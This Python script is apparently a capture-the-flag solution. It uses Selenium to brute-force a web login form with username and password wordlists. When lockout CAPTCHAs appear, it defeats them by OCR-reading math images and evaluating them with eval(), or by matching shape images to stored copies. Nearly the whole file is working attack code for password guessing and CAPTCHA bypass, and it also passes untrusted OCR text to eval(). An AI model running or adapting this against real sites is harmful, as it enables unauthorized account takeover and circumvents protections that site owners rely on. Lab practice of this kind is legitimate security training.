import sys
import os
import base64
import pytesseract
from PIL import Image
from io import BytesIO
from selenium import webdriver
from selenium.webdriver.common.by import By
import re
import time
import cv2
import numpy as np

# Function to read an image file and convert it to base64
def image_to_base64(image_path):
    with open(image_path, "rb") as img_file:
        return base64.b64encode(img_file.read()).decode("utf-8")

# Function to preprocess the image by converting it to grayscale
def preprocess_image(image_bytes):
    image = cv2.imdecode(np.frombuffer(image_bytes, np.uint8), -1)
    gray_image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    return gray_image

# Path to the folder containing the images
image_folder = "formes"

# File names of the images
circle_image_path = os.path.join(image_folder, "circle.png")
square_image_path = os.path.join(image_folder, "square.png")
triangle_image_path = os.path.join(image_folder, "triangle.png")

# Convert images to base64
image_circle_base64 = "data:image/png;base64," + image_to_base64(circle_image_path)
image_square_base64 = "data:image/png;base64," + image_to_base64(square_image_path)
image_triangle_base64 = "data:image/png;base64," + image_to_base64(triangle_image_path)

def main(usernames_filename, passwords_filename, url, browser):
    # Leer nombres de usuario desde el archivo
    with open(usernames_filename, 'r') as f:
        usernames = f.readlines()

    # Leer contraseñas desde el archivo
    with open(passwords_filename, 'r') as f:
        passwords = f.readlines()

    # Inicializar el navegador y cargar la página de inicio de sesión
    browser.get(f"http://{url}/login")  # Cargar la página de inicio de sesión

    for username in usernames:
        # Eliminar espacios en blanco alrededor del nombre de usuario
        username = username.strip()
        for password in passwords:
            time.sleep(1)
            try:
                # Encontrar los elementos de usuario y contraseña e ingresar los valores
                username_input = browser.find_element(By.ID, "username")
                password_input = browser.find_element(By.ID, "password")
                username_input.clear()
                password_input.clear()
                username_input.send_keys(username)
                password_input.send_keys(password.strip())  # Eliminar espacios en blanco alrededor de la contraseña
                print("Trying username:", username)
                print("Trying password:", password.strip())

                # Hacer clic en el botón de inicio de sesión
                login_button = browser.find_element(By.XPATH, "/html/body/div[1]/form/button")
                login_button.click()

                # Verificar si la URL ha cambiado, lo que indica que se ha iniciado sesión correctamente
                flag_element = browser.find_element(By.XPATH, "//h2[contains(text(), 'Flag.txt')]")
                if flag_element:
                    # Limpiar la consola
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print("Flag.txt encontrado!")
                    print("Username:", username)
                    print("Password:", password.strip())
                    print("Flag:", flag_element.find_element(By.XPATH, "./following-sibling::h3").text)
                    return  # Salir del script si se encuentra el archivo flag.txt	
            
            except Exception as e:
                print("INTENTANDO CON math")
                if not solving_captcha_formes(browser):
                    solving_problem_math(browser)
                continue  # Continuar con la siguiente contraseña si ocurre un error

    print("No se pudo iniciar sesión con ninguno de los usuarios.")



def solving_problem_math(browser):
    try:
        print("problema matematico")
        image_element = browser.find_element(By.XPATH, "/html/body/div[1]/form/img")
        image_base64 = image_element.get_attribute("src").split(",")[1]
        image_bytes = base64.b64decode(image_base64)
        #print("Image bytes:", image_bytes[:100])  # Add this print statement
        # Preprocesar la imagen convirtiéndola a escala de grises
        gray_image = preprocess_image(image_bytes)
        # Realizar OCR en la imagen preprocesada
        captcha_text = pytesseract.image_to_string(gray_image)
        time.sleep(0.5)
        # Extraer la expresión matemática usando expresiones regulares
        match = re.search(r'\d+\s*[+\-*/]\s*\d+', captcha_text)
        if match:
            math_expression = match.group(0)
            print("Expresión matemática:", math_expression)
            # Evaluar la expresión matemática
            result = eval(math_expression)
            print("Resultado:", result)
            put_forme = browser.find_element(By.ID, "captcha")
            put_forme.clear()
            put_forme.send_keys(result)
            time.sleep(0.5)
            login_button = browser.find_element(By.XPATH, "/html/body/div[1]/form/button")
            login_button.click()
            return True
        else:
            #print("No se pudo encontrar una expresión matemática en el captcha.")
            return False
            
    except Exception as e:
        #print("Error al resolver el captcha con el método de matemáticas:", e)
        return False


def solving_captcha_formes(browser):
    try:
        error_message = browser.find_element(By.XPATH, "/html/body/div[1]/form/b/h3")
        image_element = browser.find_element(By.XPATH, "/html/body/div[1]/form/img")
        image_source = image_element.get_attribute("src")
        print("Error: Detected 3 incorrect login attempts!")

        if image_source == image_circle_base64:
            put_forme = browser.find_element(By.ID, "captcha")
            put_forme.clear()
            time.sleep(0.5)
            put_forme.send_keys("circle")
            login_button = browser.find_element(By.XPATH, "/html/body/div[1]/form/button")
            login_button.click()
            print("Imagen source: CIRCLE")
            

        elif image_source == image_square_base64:
            put_forme = browser.find_element(By.ID, "captcha")
            put_forme.clear()
            time.sleep(0.5)
            put_forme.send_keys("square")
            login_button = browser.find_element(By.XPATH, "/html/body/div[1]/form/button")
            login_button.click()
            print("Imagen source: SQUARE")

        elif image_source == image_triangle_base64:
            put_forme = browser.find_element(By.ID, "captcha")
            put_forme.clear()
            time.sleep(0.5)
            put_forme.send_keys("triangle")
            login_button = browser.find_element(By.XPATH, "/html/body/div[1]/form/button")
            login_button.click()
            print("Imagen source: TRIANGLE")
        else:
            #print("No se pudo encontrar una expresión matemática en el captcha.")
            return False
    except Exception as e:
        #print("Error al resolver el captcha con el método de matemáticas:", e)
        return False

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 bypass-captcha-capturereturns.py <usernames_file> <passwords_file> <url>")
        sys.exit(1)

    usernames_filename = sys.argv[1]
    passwords_filename = sys.argv[2]
    url = sys.argv[3]

    # Inicializar el navegador
    options = webdriver.FirefoxOptions()
    browser = webdriver.Firefox(options=options)

    main(usernames_filename, passwords_filename, url, browser)
